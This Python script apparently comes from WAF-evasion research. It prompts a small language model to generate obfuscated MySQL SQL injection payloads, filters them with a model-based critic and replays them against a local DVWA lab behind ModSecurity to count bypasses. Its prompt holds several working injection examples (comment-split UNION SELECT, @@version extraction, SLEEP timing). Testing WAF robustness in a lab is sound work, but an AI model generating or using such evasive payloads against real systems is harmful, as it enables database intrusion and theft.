#!/usr/bin/env python3
from __future__ import annotations

import json
import os
from dataclasses import dataclass
from pathlib import Path
from typing import List, Tuple

import torch
from transformers import AutoTokenizer, AutoModelForCausalLM, BitsAndBytesConfig


ROOT = Path(__file__).resolve().parents[2]
RESULTS = ROOT / "results"


GEN_SYS_SQLI = (
    "You are a security tester. Generate concise, realistic MySQL SQLi payloads that can bypass WAF. "
    "Avoid trivial patterns like `or 1=1` without obfuscation. Output only the payload on the first line."
)

GEN_FEWSHOT_SQLI = (
    # Avoid too-trivial; show obfuscation/union/comment tricks as hints
    "Examples (for inspiration, do not copy literally):\n"
    "/*!50000UNION*/ SELECT 1,2,3 -- -\n"
    "1'/**/OR/**/1=1#\n"
    "1')/**/OR/**/('1'='1'-- -\n"
    "1'/**/UNION/**/SELECT/**/NULL,@@version,NULL#\n"
    "1' OR SLEEP(2)-- -\n"
)

GEN_PROMPT_SQLI = (
    "Attack-Type: SQLi\n"
    "Target: DVWA /vulnerabilities/sqli/?id=... (param 'id'), ModSecurity CRS PL1.\n"
    "Constraints: MySQL syntax; short; avoid obvious keywords; prefer comments/spacing/keyword splitting.\n\n"
    + GEN_FEWSHOT_SQLI
    + "\nPayload:"
)

CRIT_PROMPT = (
    "You are a strict reviewer. Decide if the given payload is non-trivial and potentially useful.\n"
    "Rules: reject if trivial (like `/`, or `<img onerror=alert(1)>`, or raw `or 1=1`), or malformed.\n"
    "Return JSON ONLY, with keys: accept (true/false), reason (string), revised (string or null).\n\n"
    "Payload: {p}\n"
)


@dataclass
class ModelBundle:
    tok: AutoTokenizer
    model: AutoModelForCausalLM


def load_base(model_name: str = "google/gemma-2-2b-it") -> ModelBundle:
    tok = AutoTokenizer.from_pretrained(model_name)
    if tok.pad_token is None:
        tok.pad_token = tok.eos_token
    tok.padding_side = "left"
    bnb = BitsAndBytesConfig(load_in_4bit=True, bnb_4bit_quant_type='nf4', bnb_4bit_use_double_quant=True, bnb_4bit_compute_dtype=torch.float16)
    model = AutoModelForCausalLM.from_pretrained(model_name, device_map='auto', quantization_config=bnb, torch_dtype=torch.float16)
    model.eval()
    return ModelBundle(tok, model)


def generate_once(m: ModelBundle, prompt: str, max_new: int = 96) -> str:
    inputs = m.tok(prompt, return_tensors='pt').to(m.model.device)
    with torch.no_grad():
        out = m.model.generate(**inputs, max_new_tokens=max_new, do_sample=True, temperature=0.8, top_p=0.9, pad_token_id=m.tok.eos_token_id)
    text = m.tok.decode(out[0], skip_special_tokens=True)
    # take last segment after Payload:
    seg = text.split("Payload:")[-1] if "Payload:" in text else text
    payload = seg.strip().splitlines()[0].strip()
    return payload


def criticize(m: ModelBundle, payload: str) -> Tuple[bool, str, str | None]:
    prompt = CRIT_PROMPT.format(p=payload)
    inputs = m.tok(prompt, return_tensors='pt').to(m.model.device)
    with torch.no_grad():
        out = m.model.generate(**inputs, max_new_tokens=128, temperature=0.3, do_sample=True, top_p=0.9, pad_token_id=m.tok.eos_token_id)
    text = m.tok.decode(out[0], skip_special_tokens=True)
    # naive JSON extraction
    try:
        js = text[text.find('{'): text.rfind('}')+1]
        data = json.loads(js)
        return bool(data.get("accept")), str(data.get("reason", "")), data.get("revised")
    except Exception:
        return False, "critic parse failure", None


def test_sqli(payloads: List[str]) -> List[dict]:
    # call existing harness.py
    import subprocess, tempfile
    tmp = tempfile.NamedTemporaryFile('w+', delete=False, encoding='utf-8')
    for p in payloads:
        tmp.write(p + "\n")
    tmp.flush()
    tmp.close()
    out = RESULTS / "icl_sqli_replay.jsonl"
    cmd = [
        "python", str(ROOT / "replay" / "harness.py"),
        tmp.name,
        "--output", str(out),
        "--base-url", "http://localhost:8080/vulnerabilities/sqli/",
        "--param-name", "id",
    ]
    subprocess.run(cmd, cwd=ROOT, check=False)
    rows = []
    if out.exists():
        for line in out.read_text(encoding='utf-8').splitlines():
            try:
                rows.append(json.loads(line))
            except Exception:
                pass
    return rows


def main() -> None:
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--n", type=int, default=3, help="number of attempts")
    args = ap.parse_args()

    RESULTS.mkdir(parents=True, exist_ok=True)

    m = load_base()

    def is_valid_sqli(p: str) -> bool:
        # Execution-based selection: minimal formatting guard only.
        s = p.strip()
        if not s:
            return False
        if s.startswith("```"):
            return False
        return True

    accepted: List[str] = []
    attempts = 0
    while attempts < args.n and len(accepted) < args.n:
        attempts += 1
        payload = generate_once(m, GEN_PROMPT_SQLI)
        ok, reason, revised = criticize(m, payload)
        final = revised.strip() if (revised and not ok) else payload
        # validity guard
        if not is_valid_sqli(final):
            continue
        accepted.append(final)

    print("Generated (post-critic):")
    for i, p in enumerate(accepted, 1):
        print(f"[{i}] {p}")

    # Test against WAF
    results = test_sqli(accepted)
    passed = [r for r in results if not r.get('blocked', True)]
    print(f"\nBypass: {len(passed)}/{len(results)}")
    (RESULTS / "icl_sqli_candidates.txt").write_text("\n".join(accepted), encoding='utf-8')


if __name__ == '__main__':
    main()
